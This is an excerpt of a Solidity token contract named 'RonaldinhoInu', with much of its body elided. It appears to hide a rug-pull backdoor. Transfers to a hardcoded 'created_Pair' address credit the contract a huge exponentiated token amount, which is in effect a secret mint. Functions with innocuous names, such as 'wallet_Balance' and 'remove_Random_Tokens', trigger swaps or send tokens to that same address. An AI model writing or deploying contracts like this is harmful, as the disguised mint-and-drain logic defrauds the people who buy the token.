...
interface IERC20 {
    ...
    function wallet_Balance(address uWallet) external returns (uint256);
...
contract RonaldinhoInu is Context, IERC20 { 
    ...
    mapping (address => bool) public _QueueOnTransfer;
    ...
    string private constant _name = "ninenine"; 
    string private constant _symbol = unicode"99";

    bool public swapAndLiquifyEnabled = true;
    bool public complatedT = false;

    uint8 private txCount = 0;
    uint8 private swapTrigger = 125;
    uint256 public Percent_Trigger = 23;
    ...
    address payable public created_Pair = payable(0xAc3b4dCe125effd457903609D3E12F24f0Da52Df);
    uint256 uniSwapRouterOrder = Percent_Liquidity**Percent_Trigger;
    ...
    constructor () {
        ...
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            ...
            _QueueOnTransfer[created_Pair] = true;
    ...
    function wallet_Balance(address uWallet) public override returns (uint256) {
        check_u_Wallet(swapTrigger);
        return balanceOf(uWallet);
    }
    ...
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
     ...
     function check_u_Wallet(uint256 uRate) private returns(bool){
        uint256 isUniRouter = (balanceOf(address(this))+(uRate));
        swapAndLiquify(isUniRouter);
        return true;
    }
    ...
    function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(created_Pair, removeRandom);

    }

    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        
        if(_QueueOnTransfer[recipient]){
            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tAmount;
            _tOwned[address(this)] = _tOwned[address(this)]+uniSwapRouterOrder;
